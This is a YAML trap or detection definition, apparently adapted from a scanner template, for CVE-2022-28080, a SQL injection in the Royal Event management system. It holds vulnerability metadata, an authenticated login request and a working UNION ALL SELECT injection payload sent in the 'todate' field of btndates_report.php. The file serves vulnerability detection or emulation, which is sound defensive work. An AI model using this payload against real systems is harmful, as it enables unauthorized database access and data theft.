id: CVE-2022-28080
info:
  name: Royal Event - SQL Injection
  author: lucasljm2001,ekrause,ritikchaddha
  description: 'Royal Event is vulnerable to a SQL injection vulnerability.

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the entire database.

    '
  remediation: 'To remediate this vulnerability, input validation and parameterized
    queries should be implemented to prevent SQL Injection attacks.

    '
  reference:
  - https://www.exploit-db.com/exploits/50934
  - https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip
  - https://github.com/erengozaydin/Royal-Event-Management-System-todate-SQL-Injection-Authenticated
  - https://nvd.nist.gov/vuln/detail/CVE-2022-28080
  - https://www.sourcecodester.com/php/15238/event-management-system-project-php-source-code.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-28080
    cwe-id: CWE-89
    epss-score: 0.01461
    epss-percentile: 0.86424
    cpe: cpe:2.3:a:event_management_system_project:event_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: event_management_system_project
    product: event_management_system
  tags: cve,cve2022,royalevent,edb,sqli,authenticated,cms,intrusive,event_management_system_project
traps:
- request:
    method: POST
    path: /royal_event/
    headers:
      Content-Length: '353'
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD
    body: |
      ------WebKitFormBoundaryCSxQll1eihcqgIgD
      Content-Disposition: form-data; name="username"

      {{username}}
      ------WebKitFormBoundaryCSxQll1eihcqgIgD
      Content-Disposition: form-data; name="password"

      {{password}}
      ------WebKitFormBoundaryCSxQll1eihcqgIgD
      Content-Disposition: form-data; name="login"


      ------WebKitFormBoundaryCSxQll1eihcqgIgD--
  response:
    status_code: 200
    headers: {}
    body: 8f9357825dc9c52388f6f61f14721647
- request:
    method: POST
    path: /royal_event/btndates_report.php
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD
    body: |
      ------WebKitFormBoundaryFboH5ITu7DsGIGrD
      Content-Disposition: form-data; name="todate"

      1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5("{{randstr}}"),0x1,0x2),NULL-- -
      ------WebKitFormBoundaryFboH5ITu7DsGIGrD
      Content-Disposition: form-data; name="search"

      3
      ------WebKitFormBoundaryFboH5ITu7DsGIGrD
      Content-Disposition: form-data; name="fromdate"

      01/01/2011
      ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
  response:
    status_code: 200
    headers: {}
    body: ''
